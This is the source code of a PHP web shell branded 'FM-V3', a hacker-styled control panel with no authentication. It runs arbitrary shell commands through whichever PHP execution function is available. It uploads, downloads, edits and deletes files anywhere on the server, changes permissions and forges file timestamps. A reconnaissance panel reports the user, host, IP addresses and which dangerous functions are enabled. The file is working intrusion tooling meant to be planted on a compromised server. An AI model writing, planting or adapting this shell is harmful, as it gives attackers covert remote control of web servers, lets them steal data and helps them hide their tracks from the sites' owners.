<?php
@error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('upload_max_filesize', '128M');
@ini_set('post_max_size', '128M');
@ini_set('max_execution_time', 300);

// ── Helpers ───────────────────────────────────────────────────────────────────
function fmsize($b) {
    if ($b >= 1073741824) return round($b/1073741824,1).'G';
    if ($b >= 1048576)    return round($b/1048576,1).'M';
    if ($b >= 1024)       return round($b/1024,1).'K';
    return $b.'B';
}
function fmperms($f) {
    $p = @fileperms($f); if ($p===false) return '?';
    $r = (is_dir($f)?'d':'-');
    $r.=($p&0x0100)?'r':'-'; $r.=($p&0x0080)?'w':'-'; $r.=($p&0x0040)?'x':'-';
    $r.=($p&0x0020)?'r':'-'; $r.=($p&0x0010)?'w':'-'; $r.=($p&0x0008)?'x':'-';
    $r.=($p&0x0004)?'r':'-'; $r.=($p&0x0002)?'w':'-'; $r.=($p&0x0001)?'x':'-';
    return $r;
}
function fmoctal($f) { return sprintf('%04o', @fileperms($f) & 0777); }
function fmowner($f) {
    if (!function_exists('fileowner')) return '?';
    $s = @stat($f); if (!$s) return '?';
    $pw = function_exists('posix_getpwuid') ? @posix_getpwuid($s['uid']) : null;
    $gr = function_exists('posix_getgrgid') ? @posix_getgrgid($s['gid']) : null;
    $u = ($pw && isset($pw['name'])) ? $pw['name'] : $s['uid'];
    $g = ($gr && isset($gr['name'])) ? $gr['name'] : $s['gid'];
    return $u.':'.$g;
}
function fmicon($f) {
    if (is_dir($f)) return '📁';
    $e = strtolower(pathinfo($f,PATHINFO_EXTENSION));
    $code  = ['php','py','js','ts','rb','go','java','c','cpp','cs','sh','bash','html','htm','css','scss'];
    $img   = ['jpg','jpeg','png','gif','svg','webp','ico','bmp'];
    $arch  = ['zip','tar','gz','rar','7z','bz2'];
    $db    = ['sql','db','sqlite'];
    $cfg   = ['json','xml','yml','yaml','toml','env','ini','conf'];
    $key   = ['key','pem','crt','p12','pfx'];
    if (in_array($e,$code))  return '📄';
    if (in_array($e,$img))   return '🖼';
    if (in_array($e,$arch))  return '🗜';
    if (in_array($e,$db))    return '🗃';
    if (in_array($e,$cfg))   return '⚙';
    if (in_array($e,$key))   return '🔑';
    return '📃';
}
function shell_fn() {
    $dis = array_map('trim', explode(',', ini_get('disable_functions')));
    foreach (['shell_exec','exec','system','passthru','popen','proc_open'] as $f)
        if (!in_array($f,$dis) && function_exists($f)) return $f;
    return false;
}
function do_cmd($cmd) {
    $f = shell_fn(); if (!$f) return '[!] No shell function available';
    if ($f==='exec') { $o=[]; exec($cmd.' 2>&1',$o); return implode("\n",$o); }
    if ($f==='popen') { $h=popen($cmd.' 2>&1','r'); $o=''; while(!feof($h)) $o.=fread($h,4096); pclose($h); return $o; }
    if ($f==='proc_open') {
        $d=[['pipe','r'],['pipe','w'],['pipe','w']];
        $p=proc_open($cmd,$d,$pp); if(!is_resource($p)) return '';
        fclose($pp[0]); $o=stream_get_contents($pp[1]).stream_get_contents($pp[2]);
        fclose($pp[1]); fclose($pp[2]); proc_close($p); return $o;
    }
    return $f($cmd.' 2>&1');
}
function breadcrumb($path) {
    $parts = explode('/', trim(str_replace('\\','/',$path), '/'));
    $acc = ''; $html = '<a href="?path=/" class="bc-link">/</a>';
    foreach ($parts as $p) {
        if (!$p) continue;
        $acc .= '/'.$p;
        $html .= '<span class="bc-sep">›</span><a href="?path='.urlencode($acc).'" class="bc-link">'.htmlspecialchars($p).'</a>';
    }
    return $html;
}
function rm_recursive($path) {
    if (is_file($path)||is_link($path)) return @unlink($path);
    foreach (@scandir($path) as $i) { if ($i==='.'||$i==='..') continue; rm_recursive($path.'/'.$i); }
    return @rmdir($path);
}
function fn_status($name) {
    $dis = array_map('trim', explode(',', ini_get('disable_functions')));
    return (!in_array($name,$dis) && function_exists($name));
}

// ── Path ──────────────────────────────────────────────────────────────────────
$path = isset($_GET['path']) ? $_GET['path'] : getcwd();
$path = realpath($path) ?: getcwd();
$path = str_replace('\\','/',$path);
chdir($path);

// ── AJAX / POST actions ───────────────────────────────────────────────────────
$msg = '';

// Terminal
if (isset($_POST['cmd'])) {
    $out = do_cmd($_POST['cmd']);
    header('Content-Type: text/plain; charset=utf-8');
    echo $out === null ? '[!] Disabled' : $out;
    exit;
}

// Upload
if (isset($_FILES['upfile']) && $_FILES['upfile']['error']===0) {
    $dest = $path.'/'.basename($_FILES['upfile']['name']);
    move_uploaded_file($_FILES['upfile']['tmp_name'], $dest)
        ? ($msg = 'ok|Uploaded: '.basename($dest))
        : ($msg = 'err|Upload failed');
}

// Delete
if (isset($_POST['delete'])) {
    $t = realpath($_POST['delete']);
    if ($t && strpos($t,$path)===0) {
        rm_recursive($t) ? ($msg='ok|Deleted') : ($msg='err|Delete failed');
    }
}

// Rename
if (isset($_POST['rename_from'],$_POST['rename_to'])) {
    $from = realpath($_POST['rename_from']);
    $to   = dirname($from).'/'.basename($_POST['rename_to']);
    rename($from,$to) ? ($msg='ok|Renamed') : ($msg='err|Rename failed');
}

// Chmod
if (isset($_POST['chmod_path'],$_POST['chmod_val'])) {
    $t = realpath($_POST['chmod_path']);
    $oct = octdec($_POST['chmod_val']);
    chmod($t,$oct) ? ($msg='ok|chmod done') : ($msg='err|chmod failed');
}

// Touch (chdate)
if (isset($_POST['touch_path'],$_POST['touch_date'])) {
    $t  = realpath($_POST['touch_path']);
    $ts = strtotime($_POST['touch_date']);
    touch($t,$ts,$ts) ? ($msg='ok|Date changed') : ($msg='err|touch failed');
}

// Create file
if (isset($_POST['newfile_name'])) {
    $fn = $path.'/'.basename($_POST['newfile_name']);
    file_put_contents($fn, isset($_POST['newfile_content']) ? $_POST['newfile_content'] : '') !== false
        ? ($msg='ok|File created')
        : ($msg='err|Create failed');
}

// Create dir
if (isset($_POST['newdir_name'])) {
    $dn = $path.'/'.basename($_POST['newdir_name']);
    @mkdir($dn,0755,true) ? ($msg='ok|Dir created') : ($msg='err|Mkdir failed');
}

// Edit save
if (isset($_POST['edit_path'],$_POST['edit_content'])) {
    $t = realpath($_POST['edit_path']);
    if ($t && strpos($t,$path)===0) {
        file_put_contents($t,$_POST['edit_content']) !== false
            ? ($msg='ok|Saved')
            : ($msg='err|Save failed');
    }
}

// Download
if (isset($_GET['dl'])) {
    $t = realpath($_GET['dl']);
    if ($t && is_file($t)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($t).'"');
        header('Content-Length: '.filesize($t));
        readfile($t); exit;
    }
}

// Edit load (AJAX)
if (isset($_GET['editload'])) {
    $t = realpath($_GET['editload']);
    if ($t && is_file($t)) { header('Content-Type: text/plain'); echo file_get_contents($t); } exit;
}

// ── File listing ──────────────────────────────────────────────────────────────
$items = @scandir($path) ?: [];
$dirs = $files = [];
foreach ($items as $i) {
    if ($i==='.') continue;
    $fp = $path.'/'.$i;
    is_dir($fp) ? ($dirs[]=$i) : ($files[]=$i);
}
sort($dirs); sort($files);

// ── Info ──────────────────────────────────────────────────────────────────────
$_pw = function_exists('posix_getpwuid') ? @posix_getpwuid(@posix_geteuid()) : null;
$whoami  = ($_pw && isset($_pw['name'])) ? $_pw['name'] : get_current_user();
$hostname = @gethostname() ?: 'unknown';
$phpver  = PHP_VERSION;
$uname   = php_uname();
$server_ip = isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : gethostbyname($hostname);
$client_ip = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : (isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '?');
$docroot = isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : '?';
$safe_mode = ini_get('safe_mode') ? 'ON' : 'OFF';
$disabled  = ini_get('disable_functions') ?: 'none';

$fn_check = ['shell_exec','exec','system','passthru','proc_open','popen',
             'symlink','readfile','file_get_contents','file_put_contents',
             'curl_exec','fsockopen','mail','eval'];

?><!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>// FM-V3 :: <?=htmlspecialchars($hostname)?></title>
<style>
:root{
  --bg:#020c02;--bg2:#040f04;--bg3:#071207;
  --green:#00ff41;--green2:#00cc33;--green3:#008f20;
  --cyan:#00fff9;--cyan2:#00bfbc;
  --red:#ff2244;--yellow:#ffe000;--orange:#ff8c00;
  --muted:#3a5c3a;--border:#0d2b0d;--border2:#1a4a1a;
  --text:#b0ffb0;--text2:#6aaa6a;
  --font:'Courier New',Courier,monospace;
}
*{margin:0;padding:0;box-sizing:border-box}
html,body{background:var(--bg);color:var(--text);font-family:var(--font);font-size:15px;min-height:100vh}
a{color:var(--cyan);text-decoration:none} a:hover{color:var(--green);text-shadow:0 0 6px var(--green)}
::-webkit-scrollbar{width:8px;height:8px} ::-webkit-scrollbar-track{background:var(--bg)} ::-webkit-scrollbar-thumb{background:var(--green3);border-radius:3px}

/* Layout */
.wrap{max-width:1600px;margin:0 auto;padding:14px 18px}

/* Header */
.hdr{display:flex;align-items:center;gap:16px;padding:14px 20px;background:var(--bg2);border-bottom:2px solid var(--green3);margin-bottom:14px}
.hdr-logo{font-size:24px;font-weight:bold;color:var(--green);text-shadow:0 0 14px var(--green);letter-spacing:3px}
.hdr-sub{color:var(--text2);font-size:14px;margin-top:3px}
.hdr-right{margin-left:auto;display:flex;gap:10px}

/* Breadcrumb */
.breadcrumb{background:var(--bg2);border:1px solid var(--border2);padding:10px 16px;margin-bottom:12px;font-size:15px;border-radius:2px}
.bc-link{color:var(--cyan)} .bc-sep{color:var(--green3);margin:0 6px}

/* Panels grid */
.panels{display:grid;grid-template-columns:1fr;gap:14px;align-items:start}

/* Box */
.box{background:var(--bg2);border:1px solid var(--border2);border-radius:2px}
.box-hdr{display:flex;align-items:center;gap:10px;padding:10px 14px;background:var(--bg3);border-bottom:1px solid var(--border2);cursor:pointer;user-select:none}
.box-hdr .ttl{color:var(--green);font-weight:bold;font-size:14px;letter-spacing:1px;text-transform:uppercase}
.box-hdr .badge{font-size:12px;color:var(--text2);margin-left:auto}
.box-body{padding:12px}

/* File table */
.ftable{width:100%;border-collapse:collapse}
.ftable th{padding:8px 12px;text-align:left;color:var(--green3);font-size:13px;border-bottom:1px solid var(--border2);text-transform:uppercase;letter-spacing:1px}
.ftable td{padding:7px 12px;border-bottom:1px solid var(--border);vertical-align:middle;font-size:14px}
.ftable tr:hover td{background:rgba(0,255,65,0.05)}
.ftable .fname{color:var(--text);max-width:260px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.ftable .fname a{color:var(--cyan)}
.ftable .fname a:hover{color:var(--green)}
.ftable .fdir a{color:var(--yellow)}
.ftable .fdir a:hover{color:var(--green)}
.ftable .fperms{color:var(--text2);font-size:13px}
.ftable .fsize{color:var(--text2);font-size:13px;text-align:right}
.ftable .fdate{color:var(--muted);font-size:13px}
.ftable .fown{color:var(--text2);font-size:12px}
.actions{display:flex;gap:4px;flex-wrap:wrap}
/* Icon buttons */
.ibtn{display:inline-flex;align-items:center;justify-content:center;width:32px;height:30px;border:1px solid var(--green3);background:transparent;color:var(--green2);cursor:pointer;border-radius:2px;transition:all .15s;position:relative;flex-shrink:0}
.ibtn svg{width:15px;height:15px;stroke:currentColor;fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;pointer-events:none}
.ibtn:hover{background:var(--green3);color:var(--bg);border-color:var(--green)}
.ibtn-red{border-color:#5c1020;color:var(--red)} .ibtn-red:hover{background:var(--red);color:#000;border-color:var(--red)}
.ibtn-cyan{border-color:#005c5a;color:var(--cyan)} .ibtn-cyan:hover{background:var(--cyan2);color:#000}
.ibtn-yellow{border-color:#5c4a00;color:var(--yellow)} .ibtn-yellow:hover{background:var(--yellow);color:#000}
.ibtn-orange{border-color:#5c3000;color:var(--orange)} .ibtn-orange:hover{background:var(--orange);color:#000}
/* Tooltip */
.ibtn::after{content:attr(data-tip);position:absolute;bottom:calc(100% + 6px);left:50%;transform:translateX(-50%);background:#0a1a0a;border:1px solid var(--green3);color:var(--green);font-size:11px;padding:3px 8px;white-space:nowrap;pointer-events:none;opacity:0;transition:opacity .15s;z-index:100;font-family:var(--font);letter-spacing:.5px}
.ibtn:hover::after{opacity:1}
.btn{display:inline-block;padding:5px 13px;font-size:13px;font-family:var(--font);border:1px solid var(--green3);background:transparent;color:var(--green2);cursor:pointer;border-radius:1px;transition:all .15s}
.btn:hover{background:var(--green3);color:var(--bg);border-color:var(--green)}
.btn-red{border-color:#5c1020;color:var(--red)} .btn-red:hover{background:var(--red);color:var(--bg);border-color:var(--red)}
.btn-cyan{border-color:#005c5a;color:var(--cyan)} .btn-cyan:hover{background:var(--cyan2);color:var(--bg)}
.btn-yellow{border-color:#5c4a00;color:var(--yellow)} .btn-yellow:hover{background:var(--yellow);color:var(--bg)}
.btn-orange{border-color:#5c3000;color:var(--orange)} .btn-orange:hover{background:var(--orange);color:var(--bg)}

/* Forms */
input[type=text],input[type=date],input[type=datetime-local],textarea,select{
  background:var(--bg);border:1px solid var(--border2);color:var(--text);
  font-family:var(--font);font-size:14px;padding:7px 12px;width:100%;border-radius:1px;outline:none}
input:focus,textarea:focus{border-color:var(--green3);box-shadow:0 0 6px rgba(0,255,65,.15)}
textarea{resize:vertical;min-height:90px}
label{color:var(--text2);font-size:13px;display:block;margin-bottom:5px}
.form-row{margin-bottom:10px}

/* Terminal */
#term-out{background:#010901;border:1px solid var(--border2);color:var(--green);font-size:14px;padding:12px;min-height:160px;max-height:380px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;margin-bottom:8px}
.term-prompt{display:flex;gap:8px;align-items:center}
.term-prompt span{color:var(--green);white-space:nowrap;font-size:14px}
#term-input{flex:1;background:transparent;border:none;border-bottom:1px solid var(--green3);color:var(--green);font-size:15px;padding:4px 6px;outline:none}

/* Info panel */
.info-row{display:flex;gap:8px;margin-bottom:6px;font-size:13px}
.info-key{color:var(--green3);min-width:120px;flex-shrink:0}
.info-val{color:var(--text);word-break:break-all}
.fn-grid{display:grid;grid-template-columns:1fr 1fr;gap:5px;margin-top:6px}
.fn-ok{color:var(--green2);font-size:13px} .fn-ok::before{content:'✔ '}
.fn-no{color:var(--red);font-size:13px;opacity:.7} .fn-no::before{content:'✘ '}

/* Msg */
.msg{padding:10px 14px;margin-bottom:12px;font-size:14px;border-radius:1px}
.msg-ok{background:rgba(0,255,65,.07);border:1px solid var(--green3);color:var(--green)}
.msg-err{background:rgba(255,34,68,.07);border:1px solid #5c1020;color:var(--red)}

/* Modal */
.modal{display:none;position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:1000;align-items:center;justify-content:center}
.modal.open{display:flex}
.modal-box{background:var(--bg2);border:1px solid var(--green3);box-shadow:0 0 40px rgba(0,255,65,.15);padding:0;min-width:560px;max-width:92vw;max-height:92vh;display:flex;flex-direction:column;border-radius:2px}
.modal-hdr{display:flex;align-items:center;padding:12px 16px;background:var(--bg3);border-bottom:1px solid var(--border2)}
.modal-title{color:var(--green);font-weight:bold;font-size:14px;letter-spacing:1px;text-transform:uppercase;flex:1}
.modal-close{color:var(--red);cursor:pointer;font-size:20px;padding:0 6px} .modal-close:hover{text-shadow:0 0 10px var(--red)}
.modal-body{padding:16px;overflow-y:auto;flex:1}
.modal-body textarea{min-height:360px;font-size:14px}

/* Glow effects */
.glow{text-shadow:0 0 8px var(--green)}
.glow-cyan{text-shadow:0 0 8px var(--cyan)}

/* Scan line animation */
@keyframes scanline{0%{transform:translateY(-100%)}100%{transform:translateY(100vh)}}
.scanline{position:fixed;top:0;left:0;width:100%;height:2px;background:linear-gradient(to bottom,transparent,rgba(0,255,65,.03),transparent);animation:scanline 8s linear infinite;pointer-events:none;z-index:9999}

/* Collapsible */
.collapsible .box-body{display:none}
.collapsible.open .box-body{display:block}

/* Perms color */
.p777{color:var(--red)} .p755{color:var(--yellow)} .p644{color:var(--green2)} .pmuted{color:var(--text2)}

/* writable indicator */
.wr-yes{color:var(--green2);font-size:13px} .wr-no{color:var(--muted);font-size:13px}

/* copy flash */
@keyframes flash{0%,100%{opacity:1}50%{opacity:.3}}
.flash{animation:flash .3s}
</style>
</head>
<body>
<div class="scanline"></div>

<!-- HEADER -->
<div class="hdr">
  <img src="https://c.tenor.com/j5h6n3wKMhMAAAAC/tenor.gif" style="height:80px;width:auto;border:1px solid var(--green3);box-shadow:0 0 18px rgba(0,255,65,.35);border-radius:2px;flex-shrink:0" alt="">
  <div>
    <div class="hdr-logo glow">// FM-V3</div>
    <div class="hdr-sub"><?=htmlspecialchars($whoami)?>@<?=htmlspecialchars($hostname)?> :: PHP <?=PHP_VERSION?></div>
  </div>
  <div class="hdr-right">
    <button class="btn btn-cyan" onclick="togglePanel('info-panel')">[ SYS INFO ]</button>
    <button class="btn btn-cyan" onclick="togglePanel('tools-panel')">[ TOOLS ]</button>
    <button class="btn btn-cyan" onclick="togglePanel('term-panel')">[ TERMINAL ]</button>
  </div>
</div>

<div class="wrap">

<?php if ($msg): list($t,$m) = explode('|',$msg,2); ?>
<div class="msg msg-<?=$t?>"><?= $t==='ok' ? '[ OK ] ' : '[ERR] ' ?><?=htmlspecialchars($m)?></div>
<?php endif; ?>

<!-- BREADCRUMB -->
<div class="breadcrumb">
  <span style="color:var(--green3);margin-right:6px">PATH://</span><?=breadcrumb($path)?>
  <span style="color:var(--text2);margin-left:12px;font-size:11px"><?= is_writable($path) ? '<span class="wr-yes">[ WRITABLE ]</span>' : '<span class="wr-no">[ READ-ONLY ]</span>' ?></span>
</div>

<!-- SYS INFO PANEL -->
<div class="box collapsible<?= isset($_GET['info']) ? ' open' : '' ?>" id="info-panel" style="margin-bottom:10px">
  <div class="box-hdr" onclick="togglePanel('info-panel')">
    <span class="ttl">// System Info</span>
    <span class="badge">[ CLICK TO EXPAND ]</span>
  </div>
  <div class="box-body">
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px">
      <div>
        <div class="info-row"><span class="info-key">USER</span><span class="info-val glow"><?=htmlspecialchars($whoami)?></span></div>
        <div class="info-row"><span class="info-key">HOSTNAME</span><span class="info-val"><?=htmlspecialchars($hostname)?></span></div>
        <div class="info-row"><span class="info-key">SERVER IP</span><span class="info-val glow-cyan"><?=htmlspecialchars($server_ip)?></span></div>
        <div class="info-row"><span class="info-key">CLIENT IP</span><span class="info-val"><?=htmlspecialchars($client_ip)?></span></div>
        <div class="info-row"><span class="info-key">PHP VERSION</span><span class="info-val"><?=PHP_VERSION?></span></div>
        <div class="info-row"><span class="info-key">SAFE MODE</span><span class="info-val <?=$safe_mode==='ON'?'fn-no':'fn-ok'?>"><?=$safe_mode?></span></div>
        <div class="info-row"><span class="info-key">UNAME</span><span class="info-val" style="font-size:10px"><?=htmlspecialchars($uname)?></span></div>
        <div class="info-row"><span class="info-key">DOC ROOT</span><span class="info-val" style="font-size:10px"><?=htmlspecialchars($docroot)?></span></div>
        <div class="info-row"><span class="info-key">CWD</span><span class="info-val" style="font-size:10px"><?=htmlspecialchars($path)?></span></div>
        <div class="info-row"><span class="info-key">FREE DISK</span><span class="info-val"><?=fmsize(@disk_free_space($path)?:0)?> / <?=fmsize(@disk_total_space($path)?:0)?></span></div>
      </div>
      <div>
        <div style="color:var(--green3);font-size:11px;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px">Function Status</div>
        <div class="fn-grid">
          <?php foreach ($fn_check as $fn): ?>
          <div class="<?=fn_status($fn)?'fn-ok':'fn-no'?>"><?=htmlspecialchars($fn)?></div>
          <?php endforeach; ?>
        </div>
        <div style="margin-top:10px;color:var(--green3);font-size:11px;text-transform:uppercase;letter-spacing:1px">Disabled Functions</div>
        <div style="color:var(--text2);font-size:10px;margin-top:4px;word-break:break-all"><?=htmlspecialchars($disabled)?></div>
      </div>
    </div>
  </div>
</div>

<!-- TOOLS PANEL -->
<div class="box collapsible" id="tools-panel" style="margin-bottom:10px">
  <div class="box-hdr" onclick="togglePanel('tools-panel')">
    <span class="ttl">// Tools</span>
    <span class="badge">[ CLICK TO EXPAND ]</span>
  </div>
  <div class="box-body">
    <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:12px">

      <!-- Upload -->
      <div>
        <div style="color:var(--green3);font-size:11px;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px">Upload File</div>
        <form method="post" enctype="multipart/form-data">
          <div class="form-row">
            <input type="file" name="upfile" style="color:var(--text2);font-size:11px;width:100%">
          </div>
          <button type="submit" class="btn btn-cyan" style="width:100%">[ UPLOAD ]</button>
        </form>
      </div>

      <!-- Create File -->
      <div>
        <div style="color:var(--green3);font-size:11px;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px">Create File</div>
        <form method="post">
          <div class="form-row"><input type="text" name="newfile_name" placeholder="filename.php"></div>
          <div class="form-row"><textarea name="newfile_content" placeholder="file content..." style="min-height:60px"></textarea></div>
          <button type="submit" class="btn" style="width:100%">[ CREATE FILE ]</button>
        </form>
      </div>

      <!-- Create Dir -->
      <div>
        <div style="color:var(--green3);font-size:11px;margin-bottom:6px;text-transform:uppercase;letter-spacing:1px">Create Directory</div>
        <form method="post">
          <div class="form-row"><input type="text" name="newdir_name" placeholder="dirname"></div>
          <button type="submit" class="btn btn-yellow" style="width:100%;margin-top:4px">[ MKDIR ]</button>
        </form>
      </div>

    </div>
  </div>
</div>

<!-- TERMINAL PANEL -->
<div class="box collapsible" id="term-panel" style="margin-bottom:10px">
  <div class="box-hdr" onclick="togglePanel('term-panel')">
    <span class="ttl">// Terminal</span>
    <span class="badge"><?=shell_fn()?'fn: '.shell_fn():'[ DISABLED ]'?></span>
  </div>
  <div class="box-body">
    <div id="term-out"><?=shell_fn()?'<span style="color:var(--green3)">// ready. type a command below.</span>':'<span style="color:var(--red)">[!] shell functions disabled on this server</span>'?></div>
    <div class="term-prompt">
      <span><?=htmlspecialchars($whoami)?>@<?=htmlspecialchars(explode('.',$hostname)[0])?>:~$</span>
      <input type="text" id="term-input" placeholder="command..." autocomplete="off" <?=!shell_fn()?'disabled':''?>>
      <button class="btn btn-cyan" onclick="runCmd()" <?=!shell_fn()?'disabled':''?>>[ RUN ]</button>
      <button class="btn" onclick="document.getElementById('term-out').innerHTML=''">[ CLEAR ]</button>
    </div>
  </div>
</div>

<!-- MAIN PANELS -->
<div class="panels">

  <!-- FILE LISTING -->
  <div class="box">
    <div class="box-hdr">
      <span class="ttl">// File System</span>
      <span class="badge"><?=count($dirs)-1+count($files)?> entries</span>
    </div>
    <div class="box-body" style="padding:0;overflow-x:auto">
      <table class="ftable">
        <thead>
          <tr>
            <th style="width:24px"></th>
            <th>NAME</th>
            <th>PERMS</th>
            <th>OWNER</th>
            <th style="text-align:right">SIZE</th>
            <th>DATE</th>
            <th>ACTIONS</th>
          </tr>
        </thead>
        <tbody>
        <?php
        $all = array_merge($dirs, $files);
        foreach ($all as $item):
            $fp = $path.'/'.$item;
            $isdir = is_dir($fp);
            $oct = fmoctal($fp);
            $pclass = $oct==='0777'?'p777':($oct==='0755'||$oct==='0775'?'p755':($oct==='0644'||$oct==='0640'?'p644':'pmuted'));
        ?>
        <tr>
          <td style="text-align:center"><?=fmicon($fp)?></td>
          <td class="fname <?=$isdir?'fdir':''?>">
            <?php if ($item==='..'): ?>
              <a href="?path=<?=urlencode(dirname($path))?>">.. [up]</a>
            <?php elseif ($isdir): ?>
              <a href="?path=<?=urlencode($fp)?>"><?=htmlspecialchars($item)?>/</a>
            <?php else: ?>
              <a href="#" onclick="doEdit('<?=addslashes($fp)?>');return false;" style="color:var(--text)" title="Click to edit"><?=htmlspecialchars($item)?></a>
            <?php endif; ?>
          </td>
          <td class="fperms <?=$pclass?>"><?=fmperms($fp)?> <span style="font-size:10px">(<?=$oct?>)</span></td>
          <td class="fown"><?=fmowner($fp)?></td>
          <td class="fsize"><?=$isdir?'—':fmsize(@filesize($fp)?:0)?></td>
          <td class="fdate"><?=date('Y-m-d H:i',@filemtime($fp)?:0)?></td>
          <td>
            <?php if ($item!=='..'): ?>
            <div class="actions">
              <?php if (!$isdir): ?>
              <button class="ibtn ibtn-cyan" onclick="doEdit('<?=addslashes($fp)?>')" data-tip="EDIT"><svg viewBox="0 0 24 24"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg></button>
              <a href="?dl=<?=urlencode($fp)?>" class="ibtn" data-tip="DOWNLOAD"><svg viewBox="0 0 24 24"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg></a>
              <?php endif; ?>
              <button class="ibtn ibtn-yellow" onclick="doRename('<?=addslashes($fp)?>','<?=addslashes($item)?>')" data-tip="RENAME"><svg viewBox="0 0 24 24"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5L17 3z"/></svg></button>
              <button class="ibtn" onclick="doChmod('<?=addslashes($fp)?>','<?=$oct?>')" data-tip="CHMOD"><svg viewBox="0 0 24 24"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg></button>
              <button class="ibtn" onclick="doTouch('<?=addslashes($fp)?>')" data-tip="CHANGE DATE"><svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg></button>
              <button class="ibtn ibtn-orange" onclick="copyPath('<?=addslashes($fp)?>')" data-tip="COPY PATH"><svg viewBox="0 0 24 24"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>
              <button class="ibtn ibtn-red" onclick="doDelete('<?=addslashes($fp)?>')" data-tip="DELETE"><svg viewBox="0 0 24 24"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/><path d="M10 11v6"/><path d="M14 11v6"/><path d="M9 6V4a1 1 0 0 1 1-1h4a1 1 0 0 1 1 1v2"/></svg></button>
            </div>
            <?php endif; ?>
          </td>
        </tr>
        <?php endforeach; ?>
        </tbody>
      </table>
    </div>
  </div>

</div>

</div><!-- /wrap -->

<!-- EDIT MODAL -->
<div class="modal" id="modal-edit">
  <div class="modal-box" style="min-width:700px">
    <div class="modal-hdr">
      <span class="modal-title">// Edit File :: <span id="edit-filename" style="color:var(--cyan)"></span></span>
      <span class="modal-close" onclick="closeModal('modal-edit')">✕</span>
    </div>
    <div class="modal-body">
      <form method="post" id="edit-form">
        <input type="hidden" name="edit_path" id="edit-path">
        <textarea name="edit_content" id="edit-content" style="min-height:400px;font-size:12px"></textarea>
        <div style="margin-top:8px;display:flex;gap:6px">
          <button type="submit" class="btn btn-cyan">[ SAVE FILE ]</button>
          <button type="button" class="btn btn-red" onclick="closeModal('modal-edit')">[ CANCEL ]</button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- RENAME MODAL -->
<div class="modal" id="modal-rename">
  <div class="modal-box" style="min-width:400px">
    <div class="modal-hdr">
      <span class="modal-title">// Rename</span>
      <span class="modal-close" onclick="closeModal('modal-rename')">✕</span>
    </div>
    <div class="modal-body">
      <form method="post">
        <input type="hidden" name="rename_from" id="rename-from">
        <div class="form-row">
          <label>NEW NAME</label>
          <input type="text" name="rename_to" id="rename-to">
        </div>
        <div style="display:flex;gap:6px;margin-top:8px">
          <button type="submit" class="btn btn-cyan">[ RENAME ]</button>
          <button type="button" class="btn btn-red" onclick="closeModal('modal-rename')">[ CANCEL ]</button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- CHMOD MODAL -->
<div class="modal" id="modal-chmod">
  <div class="modal-box" style="min-width:360px">
    <div class="modal-hdr">
      <span class="modal-title">// Chmod</span>
      <span class="modal-close" onclick="closeModal('modal-chmod')">✕</span>
    </div>
    <div class="modal-body">
      <form method="post">
        <input type="hidden" name="chmod_path" id="chmod-path">
        <div class="form-row">
          <label>OCTAL PERMISSIONS</label>
          <input type="text" name="chmod_val" id="chmod-val" placeholder="0755" maxlength="4">
        </div>
        <div style="display:flex;gap:4px;margin-bottom:8px;flex-wrap:wrap">
          <?php foreach(['0777','0755','0750','0644','0640','0600','0444'] as $p): ?>
          <button type="button" class="btn" onclick="document.getElementById('chmod-val').value='<?=$p?>'"><?=$p?></button>
          <?php endforeach; ?>
        </div>
        <div style="display:flex;gap:6px">
          <button type="submit" class="btn btn-cyan">[ CHMOD ]</button>
          <button type="button" class="btn btn-red" onclick="closeModal('modal-chmod')">[ CANCEL ]</button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- TOUCH MODAL -->
<div class="modal" id="modal-touch">
  <div class="modal-box" style="min-width:360px">
    <div class="modal-hdr">
      <span class="modal-title">// Change Date</span>
      <span class="modal-close" onclick="closeModal('modal-touch')">✕</span>
    </div>
    <div class="modal-body">
      <form method="post">
        <input type="hidden" name="touch_path" id="touch-path">
        <div class="form-row">
          <label>DATE / TIME</label>
          <input type="datetime-local" name="touch_date" id="touch-date">
        </div>
        <div style="display:flex;gap:6px;margin-top:8px">
          <button type="submit" class="btn btn-cyan">[ SET DATE ]</button>
          <button type="button" class="btn btn-red" onclick="closeModal('modal-touch')">[ CANCEL ]</button>
        </div>
      </form>
    </div>
  </div>
</div>

<!-- COPY PATH TOAST -->
